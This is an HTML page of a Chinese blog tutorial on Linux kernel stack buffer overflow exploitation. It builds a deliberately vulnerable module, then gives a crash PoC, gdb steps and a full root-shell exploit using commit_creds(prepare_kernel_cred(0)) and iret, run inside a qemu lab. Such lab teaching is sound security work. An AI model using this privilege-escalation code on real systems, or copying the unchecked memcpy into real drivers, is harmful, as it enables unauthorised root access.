@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Linux内核漏洞利用（三）Kernel Stack Buffer Overflow | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="内核栈溢出和用户态栈溢出原理一样，拷贝、拼接字符串的时候未作边界检查，导致溢出数据覆盖栈上保存的返回地址，从而劫持程序控制流。在内核空间可以用来提权。漏洞代码 stack_smashing.c   1234567891011121314151617181920212223242526#include &lt;linux&#x2F;init.h&gt;#include &lt;linux&#x2F;module.h&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux内核漏洞利用（三）Kernel Stack Buffer Overflow">
+<meta property="og:url" content="http://example.com/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="内核栈溢出和用户态栈溢出原理一样，拷贝、拼接字符串的时候未作边界检查，导致溢出数据覆盖栈上保存的返回地址，从而劫持程序控制流。在内核空间可以用来提权。漏洞代码 stack_smashing.c   1234567891011121314151617181920212223242526#include &lt;linux&#x2F;init.h&gt;#include &lt;linux&#x2F;module.h&amp;g">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/linuxkernel/stackpoc.png">
+<meta property="og:image" content="http://example.com/images/linuxkernel/debugpoc.png">
+<meta property="og:image" content="http://example.com/images/linuxkernel/debugmodule.png">
+<meta property="og:image" content="http://example.com/images/linuxkernel/debugexploit.png">
+<meta property="og:image" content="http://example.com/images/linuxkernel/getroot.png">
+<meta property="article:published_time" content="2017-04-20T03:17:39.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.716Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/linuxkernel/stackpoc.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Linux内核漏洞利用（三）Kernel-Stack-Buffer-Overflow" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/" class="article-date">
+  <time datetime="2017-04-20T03:17:39.000Z" itemprop="datePublished">2017-04-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux内核漏洞利用（三）Kernel Stack Buffer Overflow
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>内核栈溢出和用户态栈溢出原理一样，拷贝、拼接字符串的时候未作边界检查，导致溢出数据覆盖栈上保存的返回地址，从而劫持程序控制流。在内核空间可以用来提权。<br><strong>漏洞代码</strong> stack_smashing.c  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug2_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> localbuf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(localbuf, buf, len);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_smashing_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;stack_smashing driver init!\n&quot;</span>);</span><br><span class="line">    create_proc_entry(<span class="string">&quot;bug2&quot;</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;write_proc = bug2_write;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_smashing_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;stack_smashing driver exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(stack_smashing_init);</span><br><span class="line">module_exit(stack_smashing_exit);</span><br></pre></td></tr></table></figure>
+<p><strong>Makefile</strong>  </p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m := stack_smashing.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /home/fanrong/Computer/linux-kernel/linux-2.6.32/</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+<p><strong>PoC</strong> poc.c  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span> **)(buf + <span class="number">20</span>)) = <span class="number">0x42424242</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">    write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload很简单，就是buffer+eip的结构。按照上一篇文章中的编译方法，编译上面的两份代码，构建busybox文件系统，qemu启动内核，加载模块，运行poc：<br><img src="/images/linuxkernel/stackpoc.png"><br>如果poc执行造成Kernel panic，而没有将EIP覆盖为0x42424242，可能是编译Kernel时默认开启了canary，需要关闭canary选项：编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核，再次运行PoC，这时发现EIP已经被覆盖成0x42424242。</p>
+<blockquote>
+<p>调试注意事项：模块在加载进内核后，并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息传给gdb。<code>add-symbol-file</code>命令就是用来把模块的详细信息传给gdb的。由于模块也是一个ELF文件，需要知道模块的.text、.bss、.data节区地址。模块stack_smashing.ko的这三个信息分别保存在/sys/module/stack_smashing/sections/.text、/sys/module/stack_smashing/sections/.bss和/sys/module/stack_smashing/sections/.data，由于stack_smashing模块没有bss、data节区，所以只需指定text即可。</p>
+</blockquote>
+<p><strong>调试过程</strong><br>在qemu中加载模块，设置好gdbserver后，找到模块的.text段的地址：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xd883a000</span><br></pre></td></tr></table></figure>
+<p>在主机的linux-2.6.32目录中用gdb连接：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">default_idle () at arch&#x2F;x86&#x2F;kernel&#x2F;process.c:311</span><br><span class="line">311            current_thread_info()-&gt;status |&#x3D; TS_POLLING;</span><br><span class="line">gdb-peda$ add-symbol-file ..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko 0xd883a000</span><br><span class="line">add symbol table from file &quot;..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">    .text_addr &#x3D; 0xd883a000</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 1 at 0xd883a000: file &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;linux-kernel&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.c, line 7.</span><br><span class="line">gdb-peda$ c</span><br></pre></td></tr></table></figure>
+<p>qemu中运行poc之后，主机gdb命中断点：<br><img src="/images/linuxkernel/debugpoc.png"><br>可以看到如果继续执行，程序就会返回到预期的值0x42424242。<br><strong>exploit</strong><br>思路：还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是先把当前进程权限提到root，然后获取一个root的shell。<br>返回到用户模式要执行<code>IRET</code>指令。关于IRET指令：<br>当使用IRET指令返回到相同保护级别的任务时，IRET会从栈将<code>返回指令指针</code>、<code>返回代码段选择器</code>以及<code>EFLAGS映像</code>分别弹入EIP、CS以及EFLAGS寄存器，然后恢复执行中断的程序或过程。<br>当使用IRET指令返回到不同保护级别时，IRET不仅会从栈弹出以上内容，还会弹出<code>栈指针</code>以及<code>SS</code>。<br>栈上保存了trap frame，返回到用户模式的时候，恢复信息从以下结构中读取：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;       <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;     <span class="comment">// code segment +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags; <span class="comment">// CPU flags +8</span></span><br><span class="line">    <span class="keyword">void</span> *esp;       <span class="comment">// stack pointer +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;     <span class="comment">// stack segment +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
+<p>在qemu中获得两个函数的地址：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># grep prepare_kernel_cred &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1057120 T prepare_kernel_cred</span><br><span class="line"># grep commit_creds &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1056f80 T commit_creds</span><br><span class="line">c11a6b60 T security_commit_creds</span><br></pre></td></tr></table></figure>
+<p>exploit代码如下：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pushl %cs; popl tf+4;&quot;</span> <span class="comment">// set cs</span></span><br><span class="line">        <span class="string">&quot;pushfl; popl tf+8;&quot;</span> <span class="comment">// set eflags</span></span><br><span class="line">        <span class="string">&quot;pushl %esp; popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss; popl tf+16;&quot;</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span> *(*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc1057120</span>;</span><br><span class="line"><span class="keyword">void</span> *(*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc1056f80</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov $tf, %esp;&quot;</span></span><br><span class="line">        <span class="string">&quot;iret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span> **)(buf+<span class="number">20</span>)) = &amp;payload; <span class="comment">// set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试exploit需要先做一些准备工作：<br>1.确定模块代码节地址  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xd883a000</span><br></pre></td></tr></table></figure>
+<p>2.gdb设置<br>qemu上启动gdbserver，本地gdb连接  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">...</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">default_idle () at arch&#x2F;x86&#x2F;kernel&#x2F;process.c:311</span><br><span class="line">311            current_thread_info()-&gt;status |&#x3D; TS_POLLING;</span><br><span class="line">gdb-peda$ add-symbol-file ..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko 0xd883a000</span><br><span class="line">add symbol table from file &quot;..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">    .text_addr &#x3D; 0xd883a000</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 3 at 0xd883a000: file &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;linux-kernel&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.c, line 7.</span><br><span class="line">gdb-peda$ c</span><br></pre></td></tr></table></figure>
+<p>在qemu中运行exploit，对模块进行调试：<br><img src="/images/linuxkernel/debugmodule.png"><br>可以看到漏洞代码执行到ret后，继续执行会返回到我们构造的payload中：<br><img src="/images/linuxkernel/debugexploit.png"><br>这里可以看到先执行了commit_creds(prepare_kernel_cred(0))。执行到iret时，栈顶就是我们伪造的tf结构了。eip会指向get_shell函数，因此整个exploit顺利执行。<br>下面我们添加用户，然后测试exploit：<br><img src="/images/linuxkernel/getroot.png"><br>成功获取root！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3702.html">http://bobao.360.cn/learning/detail/3702.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/" data-id="ckhe7o4lq002vchl7cyipguav" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/04/22/CSAW2010-Kernel-Exploit/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CSAW2010 Kernel Exploit
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/19/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89NULL-Pointer-Dereference/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Linux内核漏洞利用（二）NULL Pointer Dereference</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li 